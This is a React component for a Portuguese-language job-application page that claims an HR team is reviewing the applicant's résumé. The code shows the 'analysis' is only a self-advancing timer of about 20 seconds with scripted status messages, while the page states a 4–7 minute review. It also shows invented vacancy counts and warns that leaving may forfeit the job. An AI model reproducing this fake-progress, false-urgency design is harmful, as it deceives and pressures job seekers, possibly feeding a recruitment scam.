/* eslint-disable no-unused-vars */

import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { useProcess } from '@/hooks/useProcess.js';
const InfoIconMin = null;
const Alert_Icon_Min = null;

// eslint-disable-next-line no-unused-vars
const ConfirmaçãoCurriculo = ({ dadosUsuario, onContinuar }) => {
    const [isLoading, setIsLoading] = useState(false);

    const handleContinuar = async () => {
        setIsLoading(true);
        try {
            await onContinuar(usuario);
        } catch (error) {
            // Silencioso
        } finally {
            setIsLoading(false);
        }
    };
    const { userData } = useProcess();
    const [usuario, setUsuario] = useState({
        nome: dadosUsuario?.nome || '',
        email: dadosUsuario?.email || ''
    });

    useEffect(() => {
        const fetchUserName = async () => {
            const userId = sessionStorage.getItem('userId');
            if (userId) {
                try {
                    const { default: backendAPI } = await import('../../services/backendAPIService.js');
                    const result = await backendAPI.getUser(userId);
                    if (result.success && result.data && result.data.nome) {
                        setUsuario(prev => ({ ...prev, nome: result.data.nome }));
                    }
                } catch (err) {
                    // Silencioso
                }
            }
        };
        fetchUserName();
    }, []);

    const handleInputChange = (field, value) => {
        setUsuario(prev => ({ ...prev, [field]: value }));
    };

    // Progresso da barra (0 a 100)
    const [progress, setProgress] = useState(0);
    // Tempo total em segundos (ajuste conforme necessário)
    const totalSeconds = 20;
     
    const [elapsed, setElapsed] = useState(0);

    // Mensagem dinâmica conforme progresso
    const getProgressMessage = (percent) => {
        if (percent < 25) return 'Estamos validando suas informações…';
        if (percent < 50) return 'Currículo em análise pelo RH…';
        if (percent < 75) return 'Conferindo aderência à vaga e disponibilidade…';
        return 'Finalizando sua avaliação. Mais um instante…';
    };

    useEffect(() => {
        if (progress < 100) {
            const timer = setTimeout(() => {
                setProgress(prev => Math.min(prev + 1, 100));
                setElapsed(prev => prev + 1);
            }, (totalSeconds * 10)); // 10ms por % para totalSeconds
            return () => clearTimeout(timer);
        }
    }, [progress]);

    // Tempo restante dinâmico
    const remainingSeconds = Math.max(totalSeconds - Math.floor((progress / 100) * totalSeconds), 0);
    const formatTime = (sec) => {
        const min = Math.floor(sec / 60);
        const s = sec % 60;
        return `${min > 0 ? min + 'm ' : ''}${s}s`;
    };

    return (
        <div className="space-y-6">
            {/* Mensagem principal */}
            <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 space-y-4">
                <h1 className="font-hendrix-semibold text-gray-800 text-lg mb-2">
                    {usuario.nome}, nossa equipe de RH está analisando o seu perfil agora.
                </h1>
                <span className="font-hendrix-medium text-gray-500 text-sm">
                    Este passo leva de 4 a 7 minutos. Não feche esta página. Ao final, vamos informar se você foi selecionado(a) para a contratação.
                </span>
                <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-1 my-5">
                    <div className="flex items-center space-x-3">
                        <div className="flex-shrink-0">
                            <img
                                className='h-6'
                                src={InfoIconMin}
                            />
                        </div>
                        <div className="flex-1">
                            <p className="font-hendrix-medium text-yellow-800" style={{ fontSize: '9pt' }}>
                                Leva menos de 7 minutos.
                            </p>
                        </div>
                    </div>
                </div>

                {/* Informações do candidato */}
                <div className="space-y-2">
                    <h2 className="font-hendrix-semibold text-gray-700 text-sm mb-3">Informações do candidato(a)</h2>
                    <div className="bg-white rounded-xl p-4 flex items-center gap-2">
                        <span className="font-hendrix-medium text-gray-700" style={{ fontSize: '10pt', minWidth: 80 }}>
                            Nome
                        </span>
                        <div className="flex-1 flex items-center">
                            <input
                                type="text"
                                className="font-hendrix-regular text-gray-800 bg-transparent border-none focus:ring-0 outline-none text-right flex-1"
                                style={{ fontSize: '10pt', minWidth: 0, marginLeft: '1rem' }}
                                value={usuario.nome}
                                onChange={e => handleInputChange('nome', e.target.value)}
                                placeholder="Nome Usuário"
                            />
                        </div>
                    </div>
                    <div className="bg-white rounded-xl p-4 flex items-center gap-2">
                        <span className="font-hendrix-medium text-gray-700" style={{ fontSize: '10pt', minWidth: 80 }}>
                            E-mail
                        </span>
                        <div className="flex-1 flex items-center gap-3">
                            <input
                                type="email"
                                className="font-hendrix-regular text-gray-800 bg-transparent border-none focus:ring-0 outline-none text-right flex-1"
                                style={{ fontSize: '10pt', minWidth: 0, marginLeft: '1rem' }}
                                value={usuario.email}
                                onChange={e => handleInputChange('email', e.target.value)}
                                placeholder="email@email.com.br"
                            />
                        </div>
                    </div>
                </div>

                {/* Vaga pretendida */}
                <div className="mt-4">
                    <h2 className="font-hendrix-semibold text-gray-900 text-sm mb-4">Vaga pretendida</h2>
                    <div className="bg-white rounded-xl border border-blue-200 p-4 shadow-sm">
                        <span className="font-hendrix-semibold text-gray-400 text-sm">672 vagas disponíveis</span>
                        <div className="flex items-center mb-2">
                            <span className="font-hendrix-semibold text-blue-600 text-2xl">Suporte ao cliente</span>
                        </div>
                        <div className="flex items-center space-x-15 mb-2  border-y-2">
                            <div>
                                <span className="font-hendrix-medium text-gray-700 text-xs">Salário mensal</span><br />
                                <span className="font-hendrix-semibold text-gray-900 text-lg">R$2.450,00</span>
                            </div>
                            <div>
                                <span className="font-hendrix-medium text-gray-700 text-xs">Vale alimentação</span><br />
                                <span className="font-hendrix-semibold text-gray-900 text-lg">R$450,00</span>
                            </div>
                        </div>
                        <div className="mb-2">
                            <span className="font-hendrix-medium text-gray-700 text-xs">+ Benefícios</span><br />
                            <span className="font-hendrix-regular text-gray-700 text-sm">Plano de saúde, plano odontológico e férias remuneradas.</span>
                        </div>
                    </div>
                </div>

                {/* Alerta de seleção */}
                <div className="bg-gray-900 text-white rounded-lg p-5 flex items-center space-x-3 mt-4">
                    <img
                        className='h-10'
                        src={Alert_Icon_Min}
                    />
                    <span className="text-sm">
                        Se você sair agora, sua análise será pausada e você pode perder sua vaga.
                    </span>
                </div>


                {/* Vídeo explicativo */}
                <div className="mt-6">
                    <span className="font-hendrix-medium text-gray-800 text-sm mb-2 block">Enquanto isso, assista a este pequeno vídeo e descubra como é trabalhar com a VagaCerta.</span>
                    <div className="w-full h-40 bg-gray-300 rounded-xl flex items-center justify-center">
                        {/* Aqui pode ser um iframe ou vídeo real */}
                        <span className="font-hendrix-medium text-gray-500">Vídeo institucional</span>
                    </div>
                </div>

                {/* Barra de progresso dinâmica */}
                <div className="mt-8">
                    <div className="w-full bg-gray-200 rounded-full h-3 mb-2">
                        <div
                            className="h-3 rounded-full transition-all duration-500 ease-out"
                            style={{
                                background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
                                width: `${progress}%`
                            }}
                        />
                    </div>
                    <div className="flex items-center justify-between">
                        <span className="font-hendrix-medium text-gray-700 text-xs">
                            {getProgressMessage(progress)}
                        </span>
                        <span className="font-hendrix-regular text-gray-500 text-xs">{progress}%</span>
                    </div>
                </div>

                {/* Rodapé de tempo */}
                <div className="flex items-center justify-between mt-6">
                    <span className="font-hendrix-regular text-gray-500 text-xs">Análise em andamento</span>
                    <span className="font-hendrix-medium text-gray-700 text-xs">Tempo restante: {formatTime(remainingSeconds)}</span>
                </div>

                {/* Botão continuar só aparece quando progresso 100% */}
                {progress === 100 && (
                    <motion.button
                        onClick={handleContinuar}
                        disabled={isLoading}
                        whileTap={{ scale: 0.97 }}
                        whileHover={{ scale: isLoading ? 1 : 1.03 }}
                        className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all duration-300 mt-6 ${isLoading ? 'cursor-not-allowed' : ''}`}
                        style={{
                            background: isLoading ? 'linear-gradient(135deg, #bdbdbd 0%, #e0e0e0 100%)' : 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)',
                            fontSize: '11pt',
                            boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
                            border: 'none',
                            opacity: isLoading ? 0.7 : 1
                        }}
                    >
                        {isLoading ? (
                            <>
                                <motion.div
                                    className="w-4 h-4 border-2 border-white border-t-transparent rounded-full"
                                    animate={{ rotate: 360 }}
                                    transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                                    style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                                />
                                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '10pt' }}>Aguarde...</span>
                            </>
                        ) : (
                            <>
                                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '10pt' }}>Continuar</span>
                            </>
                        )}
                    </motion.button>
                )}
            </div>
        </div>
    );
};

export default ConfirmaçãoCurriculo;
